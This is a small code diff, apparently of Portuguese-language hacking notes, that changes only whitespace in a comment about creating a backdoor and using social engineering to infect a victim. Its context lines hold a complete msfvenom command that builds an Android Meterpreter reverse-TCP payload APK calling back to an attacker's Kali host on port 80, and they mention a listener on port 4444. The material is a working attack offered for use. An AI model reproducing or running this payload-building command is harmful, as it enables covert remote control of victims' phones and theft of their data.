@@ -1,4 +1,4 @@
-/*Criar o Backdoor e usar Engengaria Social Para infectar a vitima*/
+/* Criar o Backdoor e usar Engengaria Social Para infectar a vitima */
 msfvenom -p android/meterpreter/reverse_tcp  LHOST=IP_Kali LPORT=80 R > Backdoor_80.apk 
 
 /* TCP na Porta 4444 */
